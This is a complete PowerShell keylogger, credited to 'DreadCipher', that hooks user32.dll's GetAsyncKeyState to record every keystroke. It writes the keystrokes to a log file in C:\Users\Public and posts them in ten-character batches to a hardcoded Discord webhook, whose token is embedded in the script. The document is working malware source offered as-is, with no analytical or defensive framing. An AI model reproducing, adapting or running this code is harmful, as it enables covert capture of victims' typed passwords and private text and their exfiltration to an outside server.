# Keylogger with Discord by DreadCipher
$webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyHook {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")]
    public static extern short GetKeyState(int vKey);
}
"@

$buffer = ""
"Keylogger started at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append

while ($true) {
    Start-Sleep -Milliseconds 100
    for ($key = 8; $key -le 254; $key++) {
        if ([KeyHook]::GetAsyncKeyState($key) -eq -32767) {
            $shift = [KeyHook]::GetKeyState(0x10) -band 0x8000
            $caps = [Console]::CapsLock
            $char = if ($key -ge 65 -and $key -le 90) {
                if ($shift -or $caps) { [char]$key } else { [char]($key + 32) }
            } elseif ($key -ge 48 -and $key -le 57) { [char]$key }
            elseif ($key -eq 32) { " " }
            elseif ($key -eq 13) { "`n" }
            elseif ($key -eq 190) { "." }
            else { "" }

            if ($char) {
                $buffer += $char
                "Key '$char' ($key) at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                if ($buffer.Length -ge 10) {
                    try {
                        "Preparing to send '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                        $payload = @{ content = "Typed: $buffer" } | ConvertTo-Json
                        "Payload created: $payload" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
                        "Sent '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                        $buffer = ""
                    } catch {
                        "Error sending '$buffer' at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                        $buffer = ""
                    }
                }
            }
        }
    }
}
